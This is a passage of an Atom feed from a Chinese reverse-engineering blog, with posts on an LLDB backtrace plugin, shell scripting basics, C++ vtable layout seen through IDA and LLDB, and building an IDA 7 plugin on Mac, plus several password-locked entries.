href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>shellscript总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/17/shellscript/shellscript/</id>
    <published>2018-04-17T10:33:40.000Z</published>
    <updated>2019-07-18T07:50:52.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shellscript总结"><a href="#shellscript总结" class="headerlink" title="shellscript总结"></a>shellscript总结</h3><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>name=&quot;zhang&quot;</code></pre><ul><li><p>变量名和等号之间不能有空格</p></li><li><p>英文，数字下划线，不能有空格，标点</p></li><li><p>不能以数字开头</p></li><li><p>不能是关键字</p></li></ul><h4 id="单引号-双引号"><a href="#单引号-双引号" class="headerlink" title="单引号/双引号"></a>单引号/双引号</h4><ul><li><p>单引号会原样输出</p></li><li><p>双引号里面可以有变量，转义字符</p></li></ul><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code class="bash"># 拼接name=&#39;zhang&#39;helloname=&quot;hello, &quot;$name&quot;!&quot;helloname=&quot;hello, &quot;${name}&quot;!&quot;#获取长度echo ${#name}  # [out]:5#提取子字符串echo ${name:1:4} #[out]:hang</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><pre><code class="bash">my_array=(A B C D)echo &quot;数组的元素为: ${my_array[1]}&quot;echo &quot;数组的元素为: ${my_array[@]}&quot;#[out]:#数组的元素为: B#数组的元素为: A B C D</code></pre><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><pre><code class="bash">#文件存在且为目录-d #文件存在且为一般文件-f#文件存在且为链接文件-L</code></pre><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><pre><code class="bash">a=10b=20if [ $a == $b ];then    echo &quot;a 等于 b&quot;elif [ $a -gt $b ];then    echo &quot;a 大于 b&quot;elif [ $a -lt $b ];then    echo &quot;a 小于 b&quot;else    echo &quot;没有符合的条件&quot;fi    # [out]:a 等于 b</code></pre><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><pre><code class="bash"># for infor loop in 1 2 3 4 5;do    echo &quot;The value is: $loop&quot;done# [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5</code></pre><h4 id="xfind"><a href="#xfind" class="headerlink" title="xfind"></a>xfind</h4><pre><code class="shell">function xfind(){    find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0  grep -i $2}if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then    echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot;else    xfind $1 $2fi</code></pre><h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><pre><code>管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数</code></pre><p>更多细节点<a href="https://www.cnblogs.com/wangqiguo/p/6464234.html" target="_blank" rel="external">这里</a></p><h4 id="function"><a href="#function" class="headerlink" title="function"></a>function</h4><p>函数返回值只能输0-255数字，且用<code>$?</code>接收</p><pre><code class="shell">function test(){    read num    return  $num}testif [ $? -eq 1 ];then    echo &quot;yes&quot;else    echo &quot;no&quot;fi</code></pre><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p><a href="http://wangchujiang.com/linux-command/c/crontab.html" target="_blank" rel="external">http://wangchujiang.com/linux-command/c/crontab.html</a></p><p>默认日志路径:<code>/var/mail/Username</code></p><p>修改邮件接收地址：<code>MAILTO=939xxxx983@qq.com</code></p><p>日志重定向：<code>* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;shellscript总结&quot;&gt;&lt;a href=&quot;#shellscript总结&quot; class=&quot;headerlink&quot; title=&quot;shellscript总结&quot;&gt;&lt;/a&gt;shellscript总结&lt;/h3&gt;&lt;h4 id=&quot;变量&quot;&gt;&lt;a href=&quot;#变量&quot; cla
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="shell" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/08/正则表达式/正则表达式/</id>
    <published>2018-04-08T08:32:33.000Z</published>
    <updated>2019-04-19T11:31:33.949Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" alt="link_s"></p><p>这里连接的库为-lida64，表示我们编译的是解析64位的插件，若要编译解析32位的插件，这里为-lida即可。</p><p>最后我们还需要设置编译参数</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/macros_s.jpg?raw=true" alt="macros_s"></p><p>其中<code>__EA64__</code>在编译64位插件时才有。</p><p>这时候build一下，如果一切顺利，应该就不会报错了。</p><h3 id="最后说两句"><a href="#最后说两句" class="headerlink" title="最后说两句"></a>最后说两句</h3><p>IDA7相以前版本而言，插件的后缀名统一为dylib格式，之前32位为pmc，64位为pmc64。这里将编译好的插件改为<strong>findcrypt264.dylib</strong>表示为64位插件，则对应的32位插件名为<strong>findcry.dylib</strong></p><p>下面测试下效果，我们打开IDA去解析一个含有md4加密的macho文件，运行插件测试能否识别出其中的加密算法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/test.jpg?raw=true" alt="test"></p><p>上图我们可以看到这里成功找到一处md4加密，反汇编窗口中正是md4加密中用到的常量数组。我顺便为插件注册了<strong>Ctrl-Alt-z</strong>的快捷键，若没有快捷键，可以在插件的导航栏里点击对应的插件即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>附上该插件，完。</p><p><a href="https://raw.githubusercontent.com/4ch12dy/4ch12dy.github.io/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/findcrypt264.dylib" target="_blank" rel="external">findcrypt264.dylib_for_ida7_made_by_x1a0</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><p><a href="http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html" target="_blank" rel="external">http://newsoft-tech.facebook.com/2014/05/setting-up-ida-sdk-65-on-mac-os-x-109.html</a></p></li><li><p><a href="http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/" target="_blank" rel="external">http://www.h4ck.org.cn/2014/09/mac-ida-pro-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97-v1-0/</a></p></li><li><p><a href="https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile">https://github.com/XVilka/htools/blob/master/codebreak/plugins/ida/Makefile</a></p><p>​</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
</feed>
